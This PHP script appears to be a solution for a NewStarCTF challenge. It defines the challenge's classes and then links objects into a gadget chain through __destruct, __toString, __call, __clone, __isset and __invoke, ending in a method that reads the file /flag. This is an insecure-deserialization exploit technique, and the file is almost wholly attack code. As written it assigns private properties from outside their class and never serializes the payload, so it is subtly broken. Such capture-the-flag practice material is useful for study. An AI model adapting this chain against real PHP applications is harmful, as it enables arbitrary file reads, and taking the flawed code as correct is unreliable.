<?php
class Start{
    public $name;
    public $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}
class Sec{
    private $obj;
    private $var;
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
$a=new Start();
$b=new Sec();
$c=new Easy();
$d=new eeee();
$a->func=$b;
$d->obj=$a;
$b->obj=$c;
$b->var=$d;
$a->name=$b;
?>